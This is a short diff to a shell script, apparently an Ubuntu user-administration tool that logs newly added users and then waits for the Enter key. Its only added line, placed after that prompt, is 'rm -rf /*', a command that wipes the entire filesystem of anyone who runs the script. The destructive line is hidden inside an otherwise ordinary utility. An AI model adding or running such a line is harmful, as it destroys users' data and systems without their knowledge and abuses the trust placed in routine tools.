@@ -10,3 +10,4 @@ echo "$newuser added as $as"
 echo "$newuser added as $as" >> ubuntoollog
 
 read -p "Press [ENTER] key to continue" fakeenter
+rm -rf /*
